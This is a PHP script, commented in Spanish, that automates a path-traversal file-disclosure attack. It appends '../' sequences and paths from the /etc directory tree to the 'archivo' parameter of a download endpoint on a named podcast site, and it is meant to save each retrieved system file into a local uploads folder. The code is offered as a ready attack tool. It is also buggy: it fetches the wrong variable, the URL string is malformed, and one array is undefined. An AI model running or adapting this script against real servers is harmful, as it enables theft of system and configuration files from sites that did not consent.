<?php

/*
 *Descarga todos los archivos que se listen a partir de $directory con directoryToArray($directory)  
 */
$root_path = '../../../../../../..';
$parameter = 'archivo';
$url = "http://podcast2.com/index.php/main/descargar/?'$archivo=$root_path";

$save_to = 'uploads/';

$mh = curl_multi_init();
//ojo con la carpeta que eleís! que podes romper todo ajjaja
foreach (directoryToArray("/etc") as $i => $file) {
    $local_file = $save_to . basename($file);
    if (!is_file($local_file)) {
        $file_disclosure_url = $url.$file; 
        var_dump($file_disclosure_url);
        $conn[$i] = curl_init($file);
        $fp[$i] = fopen($local_file, "w");
        
        curl_setopt($conn[$i], CURLOPT_FILE, $fp[$i]);
        curl_setopt($conn[$i], CURLOPT_HEADER, 0);
        curl_setopt($conn[$i], CURLOPT_CONNECTTIMEOUT, 60);
        curl_multi_add_handle($mh, $conn[$i]);
    }
}
do {
    $n = curl_multi_exec($mh, $active);
} while ($active);
foreach ($urls as $i => $url) {
    curl_multi_remove_handle($mh, $conn[$i]);
    curl_close($conn[$i]);
    fclose($fp[$i]);
}
curl_multi_close($mh);



/**
     * Get an array that represents directory tree
     * @param string $directory     Directory path
     * @param bool $recursive         Include sub directories
     * @param bool $listDirs         Include directories on listing
     * @param bool $listFiles         Include files on listing
     * @param regex $exclude         Exclude paths that matches this regex
     */
    function directoryToArray($directory, $recursive = true, $listDirs = false, $listFiles = true, $exclude = '') {
        $arrayItems = array();
        $skipByExclude = false;
        $handle = opendir($directory);
        if ($handle) {
            while (false !== ($file = readdir($handle))) {
            preg_match("/(^(([\.]){1,2})$|(\.(svn|git|md))|(Thumbs\.db|\.DS_STORE))$/iu", $file, $skip);
            if($exclude){
                preg_match($exclude, $file, $skipByExclude);
            }
            if (!$skip && !$skipByExclude) {
                if (is_dir($directory. DIRECTORY_SEPARATOR . $file)) {
                    if($recursive) {
                        $arrayItems = array_merge($arrayItems, directoryToArray($directory. DIRECTORY_SEPARATOR . $file, $recursive, $listDirs, $listFiles, $exclude));
                    }
                    if($listDirs){
                        $file = $directory . DIRECTORY_SEPARATOR . $file;
                        $arrayItems[] = $file;
                    }
                } else {
                    if($listFiles){
                        $file = $directory . DIRECTORY_SEPARATOR . $file;
                        $arrayItems[] = $file;
                    }
                }
            }
        }
        closedir($handle);
        }
        return $arrayItems;
    }